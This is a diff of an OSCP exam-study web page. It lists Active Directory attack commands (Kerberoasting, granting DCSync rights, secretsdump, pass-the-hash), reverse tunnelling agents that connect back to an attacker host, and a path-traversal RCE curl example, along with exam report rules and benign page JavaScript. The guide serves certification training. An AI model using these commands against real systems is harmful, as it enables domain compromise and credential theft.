+python3 targetedKerberoast.py -d $DOMAIN -u $USER -p $PASS --dc-ip $DC
+# LAPS / gMSA
+nxc ldap $DC -u $USER -p $PASS -M laps
+nxc ldap $DC -u $USER -p $PASS --gmsa
+</code></pre>
+<pre><code class="language-powershell"># PowerView equivalents
+Set-DomainUserPassword -Identity &lt;target&gt; -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
+Add-DomainGroupMember -Identity '&lt;group&gt;' -Members $env:USERNAME
+Add-DomainObjectAcl -TargetIdentity &quot;DC=corp,DC=local&quot; -PrincipalIdentity $env:USERNAME -Rights DCSync
+Set-DomainObject -Identity &lt;target&gt; -Set @{serviceprincipalname='x/y'}
+</code></pre>
+<div class="admonition tip">
+<p class="admonition-title">After adding a group membership</p>
+<p>A new group membership is not reflected in the token of your existing session: log in again (a new evil-winrm session / a new TGT).</p>
+</div>
+<h2 id="en-domain-admin">10.9 Domain Admin and proof</h2>
+<pre><code class="language-bash">impacket-secretsdump $DOMAIN/&lt;DA user&gt;:&lt;password&gt;@$DC -just-dc-user Administrator   # DCSync
+impacket-psexec $DOMAIN/Administrator@$DC -hashes :&lt;NTLM&gt;
+evil-winrm -i $DC -u Administrator -H &lt;NTLM&gt;
+</code></pre>
+<p>Proof on the DC (in the same frame):</p>
+<pre><code class="language-powershell">hostname; whoami; ipconfig | findstr IPv4; type C:\Users\Administrator\Desktop\proof.txt
+</code></pre>
+<p>Silver/Golden tickets, persistence after DCSync and so on earn no exam points; once you reach DA, take the proof and move on.</p>
+<h2 id="en-ad-advanced">10.10 Advanced (outside the PEN-200 syllabus — short notes only)</h2>
+<p>Exam AD sets are usually solved with the paths in 10.1. The items below are common in real life and on HTB; remember them when you see them in a lab:</p>
+<ul>
+<li><strong>ADCS:</strong> <code>certipy-ad find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -vulnerable -stdout</code> → ESC1: <code>certipy-ad req ... -template &lt;T&gt; -upn administrator@$DOMAIN</code> → <code>certipy-ad auth -pfx administrator.pfx</code></li>
+<li><strong>Shadow Credentials</strong> (GenericWrite/AddKeyCredentialLink): <code>certipy-ad shadow auto -u $USER@$DOMAIN -p $PASS -account &lt;target&gt;</code></li>
+<li><strong>RBCD / Constrained / Unconstrained delegation:</strong> <code>impacket-findDelegation $DOMAIN/$USER:$PASS -dc-ip $DC</code></li>
+<li><strong>NTLM relay + coercion</strong> (PetitPotam, PrinterBug): coercion is not spoofing, but <strong>poisoning</strong> with Responder <strong>is banned in the exam</strong>.</li>
+</ul>
+<h2 id="en-ad-mistakes">10.11 Common AD mistakes</h2>
+<ul>
+<li>Not trying the given user <strong>on every machine and every protocol</strong>.</li>
+<li><strong>Not running mimikatz/secretsdump</strong> on a machine where you are local admin (the key to the next step is there).</li>
+<li>Not trying a local admin hash you found on the other machines with <code>--local-auth</code>.</li>
+<li>Kerberos error (<code>KRB_AP_ERR_SKEW</code>) → the clock; <code>KDC_ERR_S_PRINCIPAL_UNKNOWN</code> → use the FQDN instead of the IP.</li>
+<li>No progress in AD for 3–4 hours → move to the standalone machines and come back with a fresh head.</li>
+</ul>
+<hr />
+<h1 id="en-pivoting">11. Pivoting</h1>
+<h2 id="en-pivot-when">11.1 When</h2>
+<p>A second network card in the <code>ip a</code> / <code>ipconfig</code> output, a service listening only on <strong>127.0.0.1</strong> in <code>ss -tlnp</code> / <code>netstat -ano</code>, or machines in the AD set that you cannot reach directly.</p>
+<h2 id="en-ligolo">11.2 Ligolo-ng (recommended — no proxychains needed)</h2>
+<pre><code class="language-bash"># Kali
+sudo ./proxy -selfcert -laddr 0.0.0.0:11601
+# Target (Linux / Windows)
+./agent -connect <span class="ph">LHOST</span>:11601 -ignore-cert
+.\agent.exe -connect <span class="ph">LHOST</span>:11601 -ignore-cert
+</code></pre>
+<pre><code class="language-text"># in the ligolo console (v0.6+)
+session                              → select the agent
+ifconfig                             → see the target's networks
+interface_create --name ligolo
+interface_add_route --name ligolo --route 10.10.20.0/24
+tunnel_start --tun ligolo
+# Listener on the agent, to catch a reverse shell from a machine on the internal network:
+listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:443 --tcp
+</code></pre>
+<p>Now <code>nmap -sT -Pn 10.10.20.10</code> and <code>nxc smb 10.10.20.0/24</code> work directly. For a reverse shell from an internal machine, LHOST = <strong>the pivot machine's internal IP</strong>, port 4444.
+The pivot machine's own <code>127.0.0.1</code> services: the special address <code>240.0.0.1</code> (add the route: <code>--route 240.0.0.1/32</code>).</p>
+<p>(With an older ligolo version: <code>sudo ip tuntap add user $(whoami) mode tun ligolo; sudo ip link set ligolo up; sudo ip route add 10.10.20.0/24 dev ligolo</code> and <code>start</code> in the console.)</p>
+<h2 id="en-chisel">11.3 Chisel (SOCKS + proxychains)</h2>
+<pre><code class="language-bash">./chisel server -p 8000 --reverse                         # Kali
+./chisel client <span class="ph">LHOST</span>:8000 R:socks                        # target → SOCKS5 on 127.0.0.1:1080 on Kali
+./chisel client <span class="ph">LHOST</span>:8000 R:8080:127.0.0.1:8080          # single port: target's localhost:8080 → Kali:8080
+# last line of /etc/proxychains4.conf:  socks5 127.0.0.1 1080
+proxychains4 -q nmap -sT -Pn -p 21,22,80,135,139,445,1433,3389,5985 10.10.20.10
+proxychains4 -q nxc smb 10.10.20.0/24 -u $USER -p $PASS
+</code></pre>
+<h2 id="en-ssh-pivot">11.4 SSH</h2>
+<pre><code class="language-bash">ssh -L 8080:127.0.0.1:8080 user@$IP          # target's localhost:8080 → Kali:8080
+ssh -L 4455:10.10.20.10:445 user@$IP          # internal machine:445 → Kali:4455
+ssh -D 1080 -N user@$IP                        # dynamic SOCKS
+ssh -R 1080 -N kali@<span class="ph">LHOST</span>                      # reverse dynamic from the target to Kali (sshd must run on Kali)
+sshuttle -r user@$IP 10.10.20.0/24             # VPN-like
+</code></pre>
+<h2 id="en-windows-pivot">11.5 Windows built-ins / when you cannot bring tools</h2>
+<pre><code class="language-powershell">netsh interface portproxy add v4tov4 listenport=4455 listenaddress=0.0.0.0 connectport=445 connectaddress=10.10.20.10
+netsh advfirewall firewall add rule name=&quot;p&quot; dir=in action=allow protocol=TCP localport=4455
+plink.exe -ssh -l kali -pw &lt;pw&gt; -R 127.0.0.1:9833:127.0.0.1:3389 <span class="ph">LHOST</span>
+</code></pre>
+<p>Single port on Linux: <code>socat TCP-LISTEN:4455,fork TCP:10.10.20.10:445 &amp;</code></p>
+<p>Nmap through proxychains: only <code>-sT -Pn</code>, a short port list, <code>--max-retries 1</code>. ICMP/UDP do not pass.</p>
+<hr />
+<h1 id="en-report">12. Report</h1>
+<h2 id="en-report-rules">12.1 Submission rules</h2>
+<ul>
+<li><strong>Format:</strong> a single PDF inside a <strong>.7z</strong> archive. The archive must be <strong>unencrypted</strong> and <strong>at most 200 MB</strong>. Nothing but the PDF goes in the archive: scripts and PoCs go <strong>inside the PDF as text</strong>.</li>
+<li><strong>File names (case-sensitive):</strong> <code>OSCP-OS-XXXXX-Exam-Report.pdf</code> and <code>OSCP-OS-XXXXX-Exam-Report.7z</code> (XXXXX = your OSID).</li>
+<li><strong>Upload:</strong> to <code>https://upload.offsec.com</code> within <strong>24 hours</strong> of the end of the exam. Before pressing "Submit File", compare the MD5 the site shows with your own file's (<code>md5sum</code>). <strong>Submission is final</strong> and cannot be corrected afterwards.</li>
+<li><strong>Machine order:</strong> machines are graded <strong>in the order they appear in the report</strong>.</li>
+<li><strong>Template:</strong> OffSec's Word / OpenOffice template, or your own as long as it is structured and professional.</li>
+<li><strong>Language:</strong> the guide does <strong>not specify</strong> a language requirement. Graders are international, so English is the safest choice; if you are considering another language, ask OffSec support first.</li>
+<li>Include any public exploit you modified in the report (highlight the changes + link to the original source).</li>
+<li>Using AI/LLMs is banned while writing the report as well.</li>
+</ul>
+<p>Tooling: the OffSec template (Word) or Markdown → PDF (<code>noraj/OSCP-Exam-Report-Template-Markdown</code>, pandoc + eisvogel). Set the template up <strong>before the exam</strong> and produce a practice report from a lab machine.</p>
+<h2 id="en-report-structure">12.2 Structure</h2>
+<pre><code class="language-text">1. High-Level Summary            (which machines, at which level, short recommendations)
+2. Methodology                   (information gathering, exploitation, privesc — short)
+3. Active Directory Set          (machine by machine, AD proof)
+4. Standalone Machines           (each in its own subsection)
+   x.1 Service Enumeration       (nmap summary table)
+   x.2 Initial Access            (vulnerability, CVE + link, step-by-step commands, screenshots)
+   x.3 Privilege Escalation      (step by step)
+   x.4 Proof                     (local.txt / proof.txt screenshot)
+5. Appendix                      (modified exploit code)
+</code></pre>
+<h2 id="en-report-step">12.3 Template for every step</h2>
+<pre><code class="language-markdown">**Step 3 — Exploiting Apache 2.4.49 path traversal (CVE-2021-41773)**
+The CGI directory allowed path traversal to /bin/sh, giving remote command execution:
+    curl -s --path-as-is -d 'echo Content-Type: text/plain; echo; id' \
+      &quot;http://192.168.50.10/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh&quot;
+Output (Figure 7): uid=1(daemon) gid=1(daemon)
+</code></pre>
+<p>Rules: every command must be copy-and-paste runnable; no skipping like "then I got root"; a number and a one-sentence caption for every screenshot; the CVE and a source link next to the exploit name.</p>
+<h2 id="en-report-plan">12.4 24-hour report plan</h2>
+<table>
+<thead>
+<tr>
+<th>Hour</th>
+<th>Task</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0–3</td>
+<td>Sleep (right after the exam)</td>
+</tr>
+<tr>
+<td>3–5</td>
+<td>Fill in the template: headings, nmap tables, place the screenshots</td>
+</tr>
+<tr>
+<td>5–10</td>
+<td>Machine sections — command + output + figure</td>
+</tr>
+<tr>
+<td>10–11</td>
+<td>Summary, methodology</td>
+</tr>
+<tr>
+<td>11–13</td>
+<td>Read it end to end: is every flag in the panel, is every command correct, are the IPs correct</td>
+</tr>
+<tr>
+<td>13–14</td>
+<td>PDF → 7z → upload → MD5 check → keep the confirmation e-mail</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h1 id="en-appendices">Appendices</h1>
+<h2 id="en-appendix-a">Appendix A — Exam day on one page</h2>
+<pre><code class="language-text">[ ] ID, clean desk, webcam, screen sharing (proctor)              [ ] VPN + tun0 IP → vars.sh
+[ ] tmux: 0 http.server  1 listener  2 commands  3 notes           [ ] terminal log with script
+[ ] Machine list + AD credentials from the panel noted down
+[ ] Decide which machine gets Metasploit/Meterpreter (at most 1; `check` also counts as use)
+[ ] Every machine: nmap -p- → -sC -sV → UDP 50 → web discovery
+[ ] Every shell: TTY → first-10-minutes map → credential hunting
+[ ] Every credential: reuse matrix (2.5) + nxc across the whole network
+[ ] Every flag: interactive shell + IP + whoami + hostname in one frame → SUBMIT IN THE PANEL
+[ ] 30-minute rule                                                  [ ] 03:00–07:00 sleep
+[ ] Last 90 min: is all proof + all notes complete?
+</code></pre>
+<h2 id="en-appendix-b">Appendix B — Quick proof commands</h2>
+<pre><code class="language-bash">hostname; id; ip a | grep inet; cat local.txt     # Linux
+</code></pre>
+<pre><code class="language-powershell">hostname; whoami; ipconfig | findstr IPv4; type local.txt     # Windows PowerShell
+</code></pre>
+<h2 id="en-appendix-c">Appendix C — Resources</h2>
+<table>
+<thead>
+<tr>
+<th>Resource</th>
+<th>What for</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>OffSec OSCP+ Exam Guide, Exam FAQ, Equated Scaled Scoring FAQ, Proctoring FAQ</td>
+<td>Current rules (above everything else) — help.offsec.com</td>
+</tr>
+<tr>
+<td>GTFOBins / LOLBAS</td>
+<td>Linux / Windows binary abuse</td>
+</tr>
+<tr>
+<td>HackTricks / PayloadsAllTheThings</td>
+<td>Service and web techniques</td>
+</tr>
+<tr>
+<td>The Hacker Recipes</td>
+<td>AD attacks (ACL, Kerberos, ADCS)</td>
+</tr>
+<tr>
+<td>SecLists</td>
+<td>Wordlists</td>
+</tr>
+<tr>
+<td>TJnull / LainKusanagi OSCP lists</td>
+<td>PG Practice / HTB practice machine lists</td>
+</tr>
+<tr>
+<td>PEN-200 Challenge Labs (OSCP A/B/C)</td>
+<td>The practice closest to the exam format</td>
+</tr>
+<tr>
+<td>IppSec videos (ippsec.rocks)</td>
+<td>Technique search, how to think through a box</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>This guide is not a list of commands, it is a decision system. When you are stuck, do not ask which command to run; ask <strong>which piece of information you have not collected yet</strong>.</p>
+</blockquote>
+      </div>
+
+    </main>
+  </div>
+
+  <button id="menu" type="button" aria-controls="side"><span class="t-tr">İçindekiler</span><span class="t-en" lang="en">Contents</span></button>
+
+  <footer class="site-footer">
+    <div class="container footer-inner">
+      <div class="footer-meta">
+        <p>&copy; 2026 Hüseyin Kalkan. <span class="t-tr">Tüm hakları saklıdır.</span><span class="t-en" lang="en">All rights reserved.</span></p>
+        <p class="contact-line">
+          <a href="mailto:info@huseyinkalkan.net">info@huseyinkalkan.net</a>
+          <span aria-hidden="true">·</span>
+          <a href="tel:+905365071963">+90 536 507 19 63</a>
+        </p>
+      </div>
+      <div class="social">
+        <a href="https://www.linkedin.com/in/huseyinkalkann/" rel="me noopener" target="_blank" aria-label="LinkedIn">
+          <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M20.45 20.45h-3.56v-5.57c0-1.33-.03-3.04-1.85-3.04-1.86 0-2.14 1.45-2.14 2.94v5.67H9.35V9h3.41v1.56h.05c.48-.9 1.63-1.85 3.36-1.85 3.6 0 4.27 2.37 4.27 5.45v6.29zM5.34 7.43a2.06 2.06 0 1 1 0-4.13 2.06 2.06 0 0 1 0 4.13zM7.12 20.45H3.55V9h3.57v11.45zM22.22 0H1.77C.79 0 0 .77 0 1.72v20.56C0 23.23.79 24 1.77 24h20.45c.98 0 1.78-.77 1.78-1.72V1.72C24 .77 23.2 0 22.22 0z"/></svg>
+        </a>
+        <a href="https://github.com/thehuseyinkalkan" rel="me noopener" target="_blank" aria-label="GitHub">
+          <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 .5A11.5 11.5 0 0 0 .5 12a11.5 11.5 0 0 0 7.86 10.92c.58.1.79-.25.79-.56v-2c-3.2.7-3.88-1.37-3.88-1.37-.53-1.34-1.29-1.7-1.29-1.7-1.05-.72.08-.7.08-.7 1.16.08 1.77 1.2 1.77 1.2 1.03 1.77 2.7 1.26 3.36.96.1-.75.4-1.26.73-1.55-2.56-.3-5.25-1.28-5.25-5.7 0-1.26.45-2.29 1.19-3.1-.12-.3-.52-1.47.11-3.07 0 0 .97-.31 3.18 1.18a11 11 0 0 1 5.8 0c2.2-1.49 3.17-1.18 3.17-1.18.63 1.6.23 2.77.12 3.06.74.82 1.18 1.85 1.18 3.11 0 4.43-2.69 5.4-5.26 5.69.41.36.78 1.06.78 2.14v3.17c0 .31.2.67.8.56A11.5 11.5 0 0 0 23.5 12 11.5 11.5 0 0 0 12 .5z"/></svg>
+        </a>
+        <a href="mailto:info@huseyinkalkan.net" aria-label="E-posta: info@huseyinkalkan.net">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-10 6L2 7"/></svg>
+        </a>
+        <a href="tel:+905365071963" aria-label="Telefon: +90 536 507 19 63">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6A19.79 19.79 0 0 1 2.12 4.22 2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72c.13.96.36 1.9.7 2.81a2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45c.91.34 1.85.57 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
+        </a>
+      </div>
+    </div>
+  </footer>
+
+  <script src="/assets/js/main.js" defer></script>
+  <script>
+  /* OSCP rehberi: kopyala dugmeleri, canli LHOST, bolum arama, scrollspy, mobil icindekiler */
+  (function () {
+    'use strict';
+    var root = document.documentElement;
+    var store = {
+      get: function (k) { try { return localStorage.getItem(k); } catch (e) { return null; } },
+      set: function (k, v) { try { localStorage.setItem(k, v); } catch (e) {} }
+    };
+    function lang() { return root.getAttribute('data-lang') === 'en' ? 'en' : 'tr'; }
+    var L = { tr: { copy: 'Kopyala', copied: 'Kopyalandı' }, en: { copy: 'Copy', copied: 'Copied' } };
+
+    /* Kopyala dugmeleri (bolum aramasindan ONCE: pre'ler .codewrap icine alinir) */
+    var copyBtns = [];
+    document.querySelectorAll('.guide-body pre').forEach(function (pre) {
+      var w = document.createElement('div');
+      w.className = 'codewrap';
+      pre.parentNode.insertBefore(w, pre);
+      w.appendChild(pre);
+      var b = document.createElement('button');
+      b.className = 'copy';
+      b.type = 'button';
+      b.textContent = L[lang()].copy;
+      b.addEventListener('click', function () {
+        var t = pre.innerText;
+        var fallback = function () {
+          var ta = document.createElement('textarea');
+          ta.value = t; document.body.appendChild(ta); ta.select();
+          try { document.execCommand('copy'); } catch (e) {}
+          ta.remove();
+        };
+        if (navigator.clipboard) { navigator.clipboard.writeText(t).catch(fallback); } else { fallback(); }
+        b.textContent = L[lang()].copied;
+        setTimeout(function () { b.textContent = L[lang()].copy; }, 1200);
+      });
+      w.appendChild(b);
+      copyBtns.push(b);
     });
-  });
-  var links={}; document.querySelectorAll('nav.side .toc a').forEach(function(a){links[a.getAttribute('href').slice(1)]=a});
-  var obs=new IntersectionObserver(function(es){es.forEach(function(en){
-    if(en.isIntersecting&&links[en.target.id]){
-      document.querySelectorAll('nav.side a.active').forEach(function(a){a.classList.remove('active')});
-      links[en.target.id].classList.add('active');}});},{rootMargin:'0px 0px -75% 0px'});
-  secs.forEach(function(s){if(s.h.id)obs.observe(s.h)});
-  var side=document.getElementById('side');
-  document.getElementById('menu').onclick=function(){side.classList.toggle('open')};
-  side.addEventListener('click',function(e){if(e.target.tagName==='A')side.classList.remove('open')});
-})();
-</script>
+
+    /* Canli LHOST */
+    var phs = document.querySelectorAll('.ph');
+    var inp = document.getElementById('lhost');
+    function applyHost(v) { phs.forEach(function (s) { s.textContent = v || 'LHOST'; }); }
+    var saved = store.get('oscp-lhost');
+    if (saved) { inp.value = saved; applyHost(saved); }
+    inp.addEventListener('input', function () {
+      var v = inp.value.trim();
+      applyHost(v);
+      store.set('oscp-lhost', v);
+    });
+
+    document.getElementById('print-btn').addEventListener('click', function () { window.print(); });
+
+    /* Bolumler: her dilde H1/H2 ile baslayan gruplar */
+    var secs = [];
+    document.querySelectorAll('.guide-body').forEach(function (body) {
+      var cur = null;
+      Array.prototype.forEach.call(body.children, function (el) {
+        if (el.tagName === 'H1' || el.tagName === 'H2') { cur = { h: el, els: [el] }; secs.push(cur); }
+        else if (cur) { cur.els.push(el); }
+      });
+    });
+
+    var q = document.getElementById('q');
+    function runSearch() {
+      var loc = lang() === 'tr' ? 'tr' : 'en';
+      var term = q.value.trim().toLocaleLowerCase(loc);
+      secs.forEach(function (s) {
+        var hit = !term || s.els.some(function (el) { return el.textContent.toLocaleLowerCase(loc).indexOf(term) > -1; });
+        s.els.forEach(function (el) { el.classList.toggle('hidden', !hit); });
+      });
+    }
+    q.addEventListener('input', runSearch);
+
+    document.addEventListener('langchange', function () {
+      var t = L[lang()].copy;
+      copyBtns.forEach(function (b) { b.textContent = t; });
+      runSearch();
+    });
+
+    /* Scrollspy */
+    var links = {};
+    document.querySelectorAll('nav.side .toc a').forEach(function (a) { links[a.getAttribute('href').slice(1)] = a; });
+    if ('IntersectionObserver' in window) {
+      var obs = new IntersectionObserver(function (entries) {
+        entries.forEach(function (en) {
+          if (en.isIntersecting && links[en.target.id]) {
+            document.querySelectorAll('nav.side .toc a.active').forEach(function (a) { a.classList.remove('active'); });
+            links[en.target.id].classList.add('active');
+          }
+        });
+      }, { rootMargin: '0px 0px -75% 0px' });
+      secs.forEach(function (s) { if (s.h.id) { obs.observe(s.h); } });
+    }
+
+    /* Mobil icindekiler paneli */
+    var side = document.getElementById('side');
+    var menu = document.getElementById('menu');
+    function setOpen(open) { side.classList.toggle('open', open); menu.setAttribute('aria-expanded', String(open)); }
+    menu.addEventListener('click', function () { setOpen(!side.classList.contains('open')); });
+    side.addEventListener('click', function (e) { if (e.target.closest('.toc a')) { setOpen(false); } });
+    document.addEventListener('keydown', function (e) { if (e.key === 'Escape' && side.classList.contains('open')) { setOpen(false); menu.focus(); } });
+  })();
+  </script>
 </body>
 </html>
